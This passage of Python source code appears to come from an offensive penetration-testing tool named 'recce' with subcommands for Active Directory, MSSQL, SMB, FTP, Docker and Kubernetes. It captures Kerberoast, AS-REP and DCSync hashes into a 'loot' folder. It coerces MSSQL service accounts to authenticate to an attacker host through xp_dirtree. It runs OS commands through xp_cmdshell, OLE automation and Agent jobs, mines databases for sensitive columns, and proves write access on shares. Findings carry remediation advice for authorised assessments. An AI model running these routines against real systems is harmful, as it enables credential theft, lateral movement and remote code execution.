        print("[!] --roast/--asrep/--dcsync need credentials (-u/-p or --creds) - skipped.")
        return
    if not creds.get("dc_ip"):
        print("[!] --roast/--asrep/--dcsync need --dc-ip (airgapped: no DNS) - skipped.")
        return
    graph = None
    if sh_paths:
        try:
            graph = bh.load_graph(sh_paths[0])
        except Exception:  # noqa: BLE001 - a bad graph never blocks the live run
            graph = None
    print("[*] Live Kerberos capture (read-only ticket requests / replication)...")
    live = bh.live_kerberos(creds, graph, do_roast=do_roast,
                            do_asrep=do_asrep, do_dcsync=do_dcsync)
    loot_dir = os.path.join(args.output_dir, "loot")
    for kind, fname, mode in (("kerberoast", "kerberoast.hash", 13100),
                              ("asrep", "asrep.hash", 18200),
                              ("dcsync", "secretsdump.txt", None)):
        run = live["runs"].get(kind)
        if not run:
            continue
        if run.get("error"):
            print(f"      [!] {kind}: {run['error']}")
            continue
        n = len(run.get("hashes", []))
        if kind == "dcsync":
            print(f"      [+] DCSync replicated {n} account hash(es)")
            if run.get("output"):
                os.makedirs(loot_dir, exist_ok=True)
                with open(os.path.join(loot_dir, fname), "w") as fh:
                    fh.write(run["output"])
                print(f"          loot -> {os.path.join(loot_dir, fname)}")
        else:
            print(f"      [+] {kind}: captured {n} hash(es) (hashcat -m {mode})")
            if run.get("hashes"):
                os.makedirs(loot_dir, exist_ok=True)
                with open(os.path.join(loot_dir, fname), "w") as fh:
                    fh.write("\n".join(h["hash"] for h in run["hashes"]) + "\n")
                print(f"          loot -> {os.path.join(loot_dir, fname)}")
        if run.get("output"):
            _ad_shot(args, kind, run.get("command", kind), run["output"])
    if live["findings"]:
        analysis["findings"].extend(live["findings"])
        analysis["stats"]["findings"] = len(analysis["findings"])
        print(f"    -> {len(live['findings'])} proven capture(s) folded into the "
              "findings + main totals.")


def _mssql_shot(args, ip, name, banner, command, output):
    """Render a faithful terminal screenshot of an executed MSSQL action into
    engagement/screenshots/. Returns the saved path or None."""
    if not getattr(args, "screenshots", False):
        return None
    from . import mssql, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(mssql.proof_html(command, output, banner=banner))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"mssql_{ip.replace(':', '_')}_{name}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] {ip}: proof screenshot -> {path}")
    return path


def cmd_mssql(args: argparse.Namespace) -> int:
    """MSSQL offensive enumeration: credential-free pre-auth probes (SQL Browser +
    TDS pre-login), then - with credentials - the nxc access/privilege matrix and
    the full MSSQLPwner-style runbook + attack chain, pre-filled with your creds."""
    from . import mssql
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts run MSSQL.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    creds = None
    if args.username:
        user, domain = _split_userdomain(args.username, args.domain)
        creds = {"user": user, "secret": args.password or "", "domain": domain,
                 "dc_ip": args.dc_ip or ""}

    active = not args.no_probe
    analysis = mssql.analyze(hosts, creds=creds, active=active,
                             lhost=args.lhost or "<LHOST>")
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No MSSQL endpoints in the datastore (no port 1433 / ms-sql "
              "service). Run `enum` against the SQL hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} MSSQL endpoint(s):")
    for t in tgts:
        extra = []
        if t.get("version"):
            extra.append(mssql.version_name(t["version"]))
        if t.get("encryption"):
            extra.append(f"encryption={t['encryption']}")
        if t.get("instances"):
            extra.append(f"{len(t['instances'])} instance(s) via SQL Browser")
        print(f"      {t['ip']}:{t['port']}  " + "  ".join(extra))

    # Auto-run the nxc access/privilege matrix when creds + tool are present.
    ran_nxc = False
    if creds and not args.no_run:
        tool = mssql.nxc_tool()
        if tool:
            ran_nxc = True
            for t in tgts:
                res, err = mssql.run_nxc_mssql(t["ip"], creds, port=t["port"],
                                               local_auth=args.local_auth)
                if res is None:
                    print(f"      [!] nxc mssql {t['ip']}: {err}")
                    continue
                t["access"], t["admin"] = res["access"], res["admin"]
                if res["access"]:
                    lvl = "SYSADMIN (Pwn3d!)" if res["admin"] else "login OK"
                    print(f"      [+] {t['ip']}:{t['port']}  {lvl} as {creds['user']}")
                    if res["admin"]:
                        analysis["findings"].insert(0, mssql._finding(
                            "critical", "Credentials are sysadmin on this MSSQL instance",
                            f"{t['ip']}:{t['port']}",
                            f"{creds['user']} authenticates as sysadmin (xp_cmdshell / RCE).",
                            "nxc / impacket-mssqlclient",
                            mssql._fill("nxc mssql <ip> -u <user> -p <pass> -x whoami",
                                        mssql._ctx(t, creds)),
                            "Least-privilege the login; remove sysadmin.",
                            ["CWE-250", "CWE-269"]))
        else:
            print("      [i] netexec/nxc not installed - writing the commands to run "
                  "instead (see the MSSQL sheet).")
    elif creds:
        print("      [i] --no-run set - not executing nxc; commands are in the sheet.")

    # Deep enumeration via impacket-mssqlclient: run the queries, detect the actual
    # escalation chain per instance, and enrich the findings + runbook from live data.
    ran_impacket = False
    if creds and not args.no_run and mssql.mssqlclient_tool():
        for t in tgts:
            if t.get("access") is False:            # nxc already said the creds fail
                continue
            enum, err = mssql.run_mssqlclient(t["ip"], creds, port=t["port"],
                                              windows_auth=not args.local_auth)
            if enum is None:
                print(f"      [!] mssqlclient {t['ip']}: {err}")
                continue
            ran_impacket = True
            runner = mssql.link_runner(t["ip"], creds, port=t["port"],
                                       windows_auth=not args.local_auth)
            # Verify db_owner on the TRUSTWORTHY candidates so a chain is CONFIRMED.
            dbo_map = mssql.verify_dbowner(mssql.trustworthy_sysadmin_dbs(enum), runner)
            live_fs, live_chain, summary = mssql.chains_from_enum(t, enum, creds,
                                                                  dbo_map=dbo_map or None)
            analysis["findings"] = live_fs + analysis["findings"]
            for rb in analysis["runbooks"]:
                if rb["ip"] == t["ip"]:
                    rb["live"] = summary
                    if live_chain:
                        rb["chain"] = ["Live chain: " + " -> ".join(live_chain)] + rb["chain"]
            saf = " (sysadmin)" if summary["is_sysadmin"] else ""
            conf = summary.get("dbowner_confirmed") or []
            print(f"      [+] {t['ip']}:{t['port']}  enumerated as {summary['login']}{saf}"
                  f" - {len(summary['logins'])} login(s), {len(summary['links'])} "
                  f"linked server(s), {len(summary['trustworthy'])} TRUSTWORTHY db(s)"
                  + (f", db_owner on {', '.join(conf)}" if conf else ""))

            # Optionally trigger the SQL service account to auth to --lhost (relay).
            if args.relay and args.lhost:
                ok, rerr = mssql.run_xp_dirtree(t["ip"], creds, args.lhost, port=t["port"],
                                                windows_auth=not args.local_auth)
                if ok:
                    print(f"      [+] {t['ip']}: triggered xp_dirtree -> {args.lhost} "
                          "(ensure impacket-ntlmrelayx is listening)")
                else:
                    print(f"      [!] {t['ip']}: relay trigger failed: {rerr}")

            # Recursively walk the linked-server graph from this instance.
            if summary["links"] and not args.no_links:
                nodes = mssql.walk_links(summary["links"], runner,
                                         max_depth=args.link_depth)
                if nodes:
                    lf, lchain = mssql.link_findings(t, nodes, creds)
                    analysis["findings"] = lf + analysis["findings"]
                    for rb in analysis["runbooks"]:
                        if rb["ip"] == t["ip"]:
                            rb["linkgraph"] = nodes
                            if lchain:
                                rb["chain"] = ["Linked-server chain: " + "; ".join(lchain)] \
                                    + rb["chain"]
                    sa_n = sum(1 for n in nodes if n["sysadmin"])
                    print(f"      [+] {t['ip']}: linked-server walk reached {len(nodes)} "
                          f"instance(s), {sa_n} as sysadmin")

            # Mine the databases: tables + interesting columns across every database.
            if args.data:
                dbnames = [r[0] for r in enum.get("databases", [])]
                mined = mssql.run_datamine(dbnames, runner)
                if mined:
                    df = mssql.datamine_findings(t, mined, creds)
                    analysis["findings"] = df + analysis["findings"]
                    for rb in analysis["runbooks"]:
                        if rb["ip"] == t["ip"]:
                            rb["datamine"] = mined
                    sens = sum(1 for v in mined.values() if v["interesting"])
                    print(f"      [+] {t['ip']}: data-mined "
                          f"{sum(len(v['tables']) for v in mined.values())} table(s) "
                          f"across {len(mined)} db(s), {sens} with sensitive columns")
                    sensitive = "\n".join(f"{db}: {', '.join(v['interesting'][:8])}"
                                          for db, v in mined.items() if v["interesting"])
                    if sensitive:
                        _mssql_shot(
                            args, t["ip"], "datamine",
                            f"impacket-mssqlclient {creds['user']}@{t['ip']}",
                            "SELECT s.name+'.'+t.name+'.'+c.name FROM sys.columns c ... "
                            "-- sensitive columns across all databases",
                            sensitive)

            # Per-database object-permission mining (guest / public / object grants).
            if args.perms:
                dbnames = [r[0] for r in enum.get("databases", [])]
                perms = mssql.run_permmine(dbnames, runner)
                if perms:
                    pf = mssql.permmine_findings(t, perms, creds)
                    analysis["findings"] = pf + analysis["findings"]
                    for rb in analysis["runbooks"]:
                        if rb["ip"] == t["ip"]:
                            rb["permmine"] = perms
                    guest = [db for db, v in perms.items() if v["guest"]]
                    grants = sum(len(v["grants"]) for v in perms.values())
                    print(f"      [+] {t['ip']}: permission-mined - {len(guest)} db(s) "
                          f"with guest enabled, {grants} public/guest object grant(s)")

            # Prove write + permission-modify impact, reversibly.
            if args.prove_write:
                token = os.urandom(3).hex()
                ev, werr = mssql.prove_write(t["ip"], creds, token, port=t["port"],
                                             windows_auth=not args.local_auth)
                if ev:
                    analysis["findings"].insert(0, mssql.write_proof_finding(t, ev, creds))
                    extra = " + role membership" if ev.get("perm") == "1" else ""
                    print(f"      [+] {t['ip']}: PROVED write impact (field modify"
                          f"{extra}) - reverted")
                    proof_cmds = [
                        f"CREATE TABLE ##recce_{token} (id INT, note VARCHAR(64))",
                        f"INSERT INTO ##recce_{token} VALUES (1,'before')",
                        f"SELECT note FROM ##recce_{token}   -- before",
                        f"UPDATE ##recce_{token} SET note='{ev.get('update', '')}'",
                        f"SELECT note FROM ##recce_{token}   -- after (MODIFIED)",
                        f"DROP TABLE ##recce_{token}   -- reverted"]
                    proof_out = f"before\n{ev.get('update', '')}"
                    if ev.get("perm") == "1":
                        proof_cmds.append("ALTER SERVER ROLE dbcreator ADD MEMBER "
                                          f"recce_{token}; SELECT IS_SRVROLEMEMBER(...)")
                        proof_out += "\n1   -- role membership added (then reverted)"
                    _mssql_shot(args, t["ip"], "write_proof",
                                f"impacket-mssqlclient {creds['user']}@{t['ip']}",
                                proof_cmds, proof_out)
                else:
                    print(f"      [!] {t['ip']} write proof: {werr}")

            # Execute an OS command for effect (xp_cmdshell / OLE / Agent / CLR).
            if args.exec_cmd:
                out, eerr, ref = mssql.exec_command(
                    t["ip"], creds, args.exec_cmd, method=args.method,
                    port=t["port"], windows_auth=not args.local_auth)
                if ref:
                    print(f"      [i] {t['ip']} CLR is a tool hand-off: {ref}")
                elif eerr:
                    print(f"      [!] {t['ip']} exec ({args.method}): {eerr}")
                else:
                    snippet = " | ".join((out or "(no output)").splitlines()[:4])
                    print(f"      [+] {t['ip']} RCE via {args.method}: {snippet}")
                    rce_cmds = {
                        "xp": [f"EXEC xp_cmdshell '{args.exec_cmd}'"],
                        "ole": ["EXEC sp_OACreate 'WScript.Shell', @o OUT",
                                f"EXEC sp_OAMethod @o,'Run',NULL,'cmd /c {args.exec_cmd} ...'"],
                        "agent": ["EXEC msdb.dbo.sp_add_jobstep @subsystem='CmdExec', "
                                  f"@command='cmd /c {args.exec_cmd}'"],
                    }.get(args.method, [f"EXEC ... {args.exec_cmd}"])
                    _mssql_shot(args, t["ip"], f"rce_{args.method}",
                                f"impacket-mssqlclient {creds['user']}@{t['ip']}",
                                rce_cmds, out or "(no output)")
                    analysis["findings"].insert(0, mssql._finding(
                        "critical", f"Confirmed OS command execution via {args.method}",
                        f"{t['ip']}:{t['port']}",
                        f"Ran '{args.exec_cmd}' as the SQL service account. Output: "
                        + (out or "")[:400], "impacket-mssqlclient",
                        f"recce mssql -u <user> -p <pass> --exec '{args.exec_cmd}' "
                        f"--method {args.method}",
                        "Disable the primitive; run SQL under a low-privilege gMSA.",
                        ["CWE-250", "CWE-269"], kind="rce_confirmed"))

    # With any login we can coerce the service account's NetNTLM via UNC -> relay
    # it. Add the concrete relay finding (real targets) per endpoint.
    if creds:
        for t in tgts:
            rt = mssql.relay_targets(hosts, t["ip"])
            analysis["findings"].append(
                mssql.relay_finding(t, rt, args.lhost or "<LHOST>", creds))

    # De-duplicate findings (offline + nxc + live can overlap) by (title, target).
    seen: set = set()
    uniq = []
    for f in analysis["findings"]:
        k = (f["title"], f["target"])
        if k not in seen:
            seen.add(k)
            uniq.append(f)
    analysis["findings"] = uniq

    # Fold findings into the main severity totals + writeups (attach to each host).
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    analysis["findings"].sort(key=lambda x: order.get(x["severity"], 5))
    analysis["stats"]["findings"] = len(analysis["findings"])
    by_ip = mssql.findings_to_vulns(analysis["findings"])
    host_by_ip = {h.ip: h for h in hosts}
    for ip, vulns in by_ip.items():
        host = host_by_ip.get(ip) or store.get_host(ip)
        if host is None:
            continue
        have = {v.key for v in host.vulns if v.source != "mssql"}
        host.vulns = [v for v in host.vulns if v.source != "mssql"]   # refresh MSSQL set
        for v in vulns:
            if v.key not in have:
                have.add(v.key)
                host.vulns.append(v)
        store.upsert_host(host, merge=False)

    store.set_meta("mssql", json.dumps(analysis))
    # Running mssql assessed each SQL port (and is a DB deep-enum) -> auto-tick the
    # Checklist DB / Vuln-scan boxes for those hosts.
    if active or (creds and not args.no_run):
        _mark_capability_scanned(store, tgts, db=True)
    if analysis["findings"]:
        by_sev: dict = {}
        for f in analysis["findings"]:
            by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
        print("[+] {} MSSQL finding(s): ".format(len(analysis["findings"]))
              + ", ".join(f"{by_sev[s]} {s}" for s in
                          ("critical", "high", "medium", "low") if by_sev.get(s)))
    for t in tgts:
        for line in analysis["runbooks"][next(i for i, r in enumerate(analysis["runbooks"])
                                              if r["ip"] == t["ip"])]["chain"]:
            print(f"      {line}")
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    ran = [x for x, on in (("nxc", ran_nxc), ("impacket enum", ran_impacket)) if on]
    hint = " + ".join(ran) if ran else "commands-only"
    print(f"    -> MSSQL sheet written ({hint}); findings folded into the main totals.")
    return 0


def _smb_shot(args, ip, name, command, output):
    """Render a terminal-output proof screenshot of a live SMB action into
    engagement/screenshots/. Returns the saved path or None."""
    if not getattr(args, "screenshots", False):
        return None
    from . import smb, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(smb.proof_html(command, output))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"smb_{ip.replace(':', '_')}_{name}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] {ip}: proof screenshot -> {path}")
    return path


def cmd_smb(args: argparse.Namespace) -> int:
    """SMB offensive enumeration: credential-free stdlib negotiate probes (dialect /
    signing / SMBv1), then anonymous & credentialed share enumeration, a reversible
    writable-share proof, and the full runbook - folded into the main totals."""
    from . import smb
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts run SMB.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    creds = None
    if args.username:
        user, domain = _split_userdomain(args.username, args.domain)
        creds = {"user": user, "secret": args.password or "", "domain": domain,
                 "dc_ip": args.dc_ip or ""}

    active = not args.no_probe
    analysis = smb.analyze(hosts, creds=creds, active=active)
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No SMB endpoints in the datastore (no port 445/139). Run `enum` "
              "against the SMB hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} SMB endpoint(s):")
    for t in tgts:
        bits = [t.get("dialect") or ""]
        if t.get("signing_required") is False:
            bits.append("signing NOT REQUIRED")
        if t.get("smbv1"):
            bits.append("SMBv1 ENABLED")
        print(f"      {t['ip']}:{t['port']}  " + "  ".join(b for b in bits if b))

    # Record the directly-observed signing posture on each host so the prove engine
    # (_v_smb_signing) can adjudicate a relay finding as CONFIRMED, not a guess.
    host_by_ip = {h.ip: h for h in hosts}
    for t in tgts:
        req = t.get("signing_required")
        if req is None:
            continue
        host = host_by_ip.get(t["ip"])
        if host is not None:
            host.smb_signing = "required" if req else "not required"

    # Live layer: anonymous (null/guest) share enumeration + reversible write proof.
    rb_by_ip = {rb["ip"]: rb for rb in analysis["runbooks"]}
    ran_live = False
    if not args.no_run:
        for t in tgts:
            ip, port = t["ip"], t["port"]
            # Try a null session first, then guest.
            session = smb.enum_session(ip, "", "", port=port)
            if session.get("error") and "not installed" in (session["error"] or ""):
                print("      [i] nxc/netexec not installed - writing the commands to "
                      "run instead (see the SMB sheet).")
                break
            if not (session.get("shares") or session.get("users")):
                session = smb.enum_session(ip, "guest", "", port=port)
            ran_live = True
            shares = session.get("shares") or []
            live = {"shares": shares, "writable": [],
                    "session": (f"anonymous session: {len(shares)} share(s), "
                                f"{len(session.get('users') or [])} user(s)")}
            analysis["findings"].extend(smb.null_session_findings(ip, port, session))
            if session.get("output"):
                _smb_shot(args, ip, "enum",
                          f"nxc smb {ip} -u '' -p '' --shares --users --pass-pol",
                          session["output"])
            # Prove writable shares (reversible) when requested.
            if args.prove_write:
                for s in shares:
                    perms = (s.get("perms") or "").upper()
                    name = s.get("name", "")
                    if "WRITE" not in perms or name.upper() in ("IPC$", "PRINT$"):
                        continue
                    proof = smb.prove_writable(ip, name, creds, port=port)
                    if proof.get("writable"):
                        live["writable"].append({"share": name,
                                                 "evidence": proof.get("evidence", "")})
                        f = smb.write_proof_finding(ip, port, name, proof, creds)
                        if f:
                            analysis["findings"].insert(0, f)
                        _smb_shot(args, ip, f"write_{name}",
                                  proof.get("command", ""), proof.get("evidence", ""))
            rb_by_ip[ip]["live"] = live

    # De-duplicate (offline + live can overlap) by (title, target).
    seen: set = set()
    uniq = []
    for f in analysis["findings"]:
        k = (f["title"], f["target"])
        if k not in seen:
            seen.add(k)
            uniq.append(f)
    analysis["findings"] = uniq

    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    analysis["findings"].sort(key=lambda x: order.get(x["severity"], 5))
    analysis["stats"]["findings"] = len(analysis["findings"])
    by_ip = smb.findings_to_vulns(analysis["findings"])
    for ip, vulns in by_ip.items():
        host = host_by_ip.get(ip) or store.get_host(ip)
        if host is None:
            continue
        have = {v.key for v in host.vulns if v.source != "smb"}
        host.vulns = [v for v in host.vulns if v.source != "smb"]      # refresh SMB set
        for v in vulns:
            if v.key not in have:
                have.add(v.key)
                host.vulns.append(v)
        store.upsert_host(host, merge=False)
    # Persist the signing posture we observed (upsert any host we touched but that
    # produced no vulns, so host.smb_signing still lands).
    for t in tgts:
        if t["ip"] not in by_ip:
            host = host_by_ip.get(t["ip"])
            if host is not None and t.get("signing_required") is not None:
                store.upsert_host(host, merge=False)

    store.set_meta("smb", json.dumps(analysis))
    if active:                       # assessed the SMB port(s) -> auto-tick vuln-scan
        _mark_capability_scanned(store, tgts)
    if analysis["findings"]:
        by_sev: dict = {}
        for f in analysis["findings"]:
            by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
        print("[+] {} SMB finding(s): ".format(len(analysis["findings"]))
              + ", ".join(f"{by_sev[s]} {s}" for s in
                          ("critical", "high", "medium", "low") if by_sev.get(s)))
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    hint = "live enum" if ran_live else "commands-only"
    print(f"    -> SMB sheet written ({hint}); findings folded into the main totals.")
    return 0


def _ftp_shot(args, ip, name, command, output):
    if not getattr(args, "screenshots", False):
        return None
    from . import ftp, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(ftp.proof_html(command, output))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"ftp_{ip.replace(':', '_')}_{name}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] {ip}: proof screenshot -> {path}")
    return path


def cmd_ftp(args: argparse.Namespace) -> int:
    """FTP offensive enumeration: credential-free stdlib probe (banner / anonymous /
    AUTH-TLS + known-backdoor match), then a reversible writable-directory proof -
    folded into the main totals."""
    from . import ftp
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts run FTP.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    creds = None
    if args.username:
        creds = {"user": args.username, "secret": args.password or ""}

    active = not args.no_probe
    analysis = ftp.analyze(hosts, creds=creds, active=active)
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No FTP endpoints in the datastore (no port 21 / ftp service). Run "
              "`enum` against the FTP hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} FTP endpoint(s):")
    for t in tgts:
        bits = [t.get("banner") or t.get("product") or ""]
        if t.get("anonymous"):
            bits.append("ANONYMOUS")
        if t.get("auth_tls") is False:
            bits.append("cleartext (no AUTH TLS)")
        print(f"      {t['ip']}:{t['port']}  " + "  ".join(b for b in bits if b))

    host_by_ip = {h.ip: h for h in hosts}
    rb_by_ip = {rb["ip"]: rb for rb in analysis["runbooks"]}
    ran_live = False
    if not args.no_run and args.prove_write:
        for t in tgts:
            # Only attempt a write when a session is actually reachable (anonymous or
            # supplied creds), so we don't hammer a login we can't make.
            if not (t.get("anonymous") or creds):
                continue
            proof = ftp.prove_writable(t["ip"], t["port"], creds)
            ran_live = True
            if proof.get("writable"):
                rb_by_ip[t["ip"]]["live"] = {"writable": True,
                                             "evidence": proof.get("evidence", "")}
                f = ftp.write_proof_finding(t["ip"], t["port"], proof, creds)
                if f:
                    analysis["findings"].insert(0, f)
                _ftp_shot(args, t["ip"], "write",
                          f"ftp {t['ip']}  (STOR/DELE marker)", proof.get("evidence", ""))
            elif proof.get("error"):
                print(f"      [!] {t['ip']}: write proof - {proof['error']}")

    seen: set = set()
    uniq = []
    for f in analysis["findings"]:
        k = (f["title"], f["target"])
        if k not in seen:
            seen.add(k)
            uniq.append(f)
    analysis["findings"] = uniq

    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    analysis["findings"].sort(key=lambda x: order.get(x["severity"], 5))
    analysis["stats"]["findings"] = len(analysis["findings"])
    by_ip = ftp.findings_to_vulns(analysis["findings"])
    for ip, vulns in by_ip.items():
        host = host_by_ip.get(ip) or store.get_host(ip)
        if host is None:
            continue
        have = {v.key for v in host.vulns if v.source != "ftp"}
        host.vulns = [v for v in host.vulns if v.source != "ftp"]      # refresh FTP set
        for v in vulns:
            if v.key not in have:
                have.add(v.key)
                host.vulns.append(v)
        store.upsert_host(host, merge=False)

    store.set_meta("ftp", json.dumps(analysis))
    if active:                       # assessed the FTP port -> auto-tick vuln-scan
        _mark_capability_scanned(store, tgts)
    if analysis["findings"]:
        by_sev: dict = {}
        for f in analysis["findings"]:
            by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
        print("[+] {} FTP finding(s): ".format(len(analysis["findings"]))
              + ", ".join(f"{by_sev[s]} {s}" for s in
                          ("critical", "high", "medium", "low") if by_sev.get(s)))
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    hint = "write proof" if ran_live else "commands-only"
    print(f"    -> FTP sheet written ({hint}); findings folded into the main totals.")
    return 0


def cmd_docker(args: argparse.Namespace) -> int:
    """Docker Engine API enumeration: read the API unauthenticated (stdlib HTTP) and,
    if it answers, report the CONFIRMED critical exposure (remote root RCE on the
    host). recce reads the API to prove it - it never creates a container."""
    from . import docker
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts expose the Docker API.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    active = not args.no_probe
    analysis = docker.analyze(hosts, active=active)
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No Docker API endpoints in the datastore (no port 2375/2376). Run "
              "`enum` against the Docker hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} Docker endpoint(s):")
    for t in tgts:
        if t.get("exposed"):
            state = "EXPOSED (unauth)"
        elif t.get("probed"):
            state = "locked (mutual-TLS / authenticated)"
        else:
            state = "not probed"
        extra = f"  {t.get('version', '')}" if t.get("version") else ""
        print(f"      {t['ip']}:{t['port']}  {state}{extra}")

    # Optional proof screenshot of the (synthesised) `docker info` for exposed hosts.
    if getattr(args, "screenshots", False):
        for t in tgts:
            pr = analysis["probes"].get(f"{t['ip']}:{t['port']}")
            if pr and pr.get("exposed"):
                out = (f"Server Version: {pr.get('server_version', '')}\n"
                       f"Name: {pr.get('name', '')}\n"
                       f"Containers: {pr.get('containers', '?')}  "
                       f"Images: {pr.get('images', '?')}\n"
                       f"Kernel Version: {pr.get('kernel', '')}")
                _docker_shot(args, t["ip"],
                             f"docker -H {docker._scheme(t['port'])}://{t['ip']}:"
                             f"{t['port']} info", out)

    host_by_ip = {h.ip: h for h in hosts}
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    analysis["findings"].sort(key=lambda x: order.get(x["severity"], 5))
    analysis["stats"]["findings"] = len(analysis["findings"])
    by_ip = docker.findings_to_vulns(analysis["findings"])
    for ip, vulns in by_ip.items():
        host = host_by_ip.get(ip) or store.get_host(ip)
        if host is None:
            continue
        have = {v.key for v in host.vulns if v.source != "docker"}
        host.vulns = [v for v in host.vulns if v.source != "docker"]   # refresh set
        for v in vulns:
            if v.key not in have:
                have.add(v.key)
                host.vulns.append(v)
        store.upsert_host(host, merge=False)

    store.set_meta("docker", json.dumps(analysis))
    if active:                       # read the Docker API port -> auto-tick vuln-scan
        _mark_capability_scanned(store, tgts)
    if analysis["findings"]:
        by_sev: dict = {}
        for f in analysis["findings"]:
            by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
        print("[+] {} Docker finding(s): ".format(len(analysis["findings"]))
              + ", ".join(f"{by_sev[s]} {s}" for s in
                          ("critical", "high", "medium", "low") if by_sev.get(s)))
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> Docker sheet written; findings folded into the main totals.")
    return 0


def _docker_shot(args, ip, command, output):
    from . import docker, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(docker.proof_html(command, output))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"docker_{ip.replace(':', '_')}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] {ip}: proof screenshot -> {path}")
    return path


def cmd_kubernetes(args: argparse.Namespace) -> int:
    """Kubernetes attack-surface enumeration: unauthenticated reads of the kubelet
    (10250/10255), kube-apiserver (6443/8443) and etcd (2379). recce only READS to
    prove exposure - it never execs into a pod or writes to etcd."""
    from . import kubernetes as k8s
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts run Kubernetes.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    active = not args.no_probe
    analysis = k8s.analyze(hosts, active=active)
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No Kubernetes endpoints in the datastore (no kubelet/apiserver/etcd "
              "port). Run `enum` against the cluster hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} Kubernetes surface(s):")
    for t in tgts:
        exposed = (t.get("anon_pods") or t.get("anon_list")
                   or t.get("v2_readable") or t.get("v3_readable"))
        state = "EXPOSED (unauth)" if exposed else \
            ("reachable" if t.get("reachable") else "not probed")
        print(f"      {t['ip']}:{t['port']}  {t.get('role', '')}  {state}")

    host_by_ip = {h.ip: h for h in hosts}
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    analysis["findings"].sort(key=lambda x: order.get(x["severity"], 5))
    analysis["stats"]["findings"] = len(analysis["findings"])
    by_ip = k8s.findings_to_vulns(analysis["findings"])
    for ip, vulns in by_ip.items():
        host = host_by_ip.get(ip) or store.get_host(ip)
        if host is None:
            continue
        have = {v.key for v in host.vulns if v.source != "kubernetes"}
        host.vulns = [v for v in host.vulns if v.source != "kubernetes"]  # refresh set
        for v in vulns:
            if v.key not in have:
                have.add(v.key)
                host.vulns.append(v)
        store.upsert_host(host, merge=False)

    store.set_meta("kubernetes", json.dumps(analysis))
    if active:                       # probed the kubelet/API/etcd ports -> vuln-scan
        _mark_capability_scanned(store, tgts)
    if analysis["findings"]:
        by_sev: dict = {}
        for f in analysis["findings"]:
            by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
        print("[+] {} Kubernetes finding(s): ".format(len(analysis["findings"]))
              + ", ".join(f"{by_sev[s]} {s}" for s in
                          ("critical", "high", "medium", "low") if by_sev.get(s)))
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> Kubernetes sheet written; findings folded into the main totals.")
    return 0


def cmd_report(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
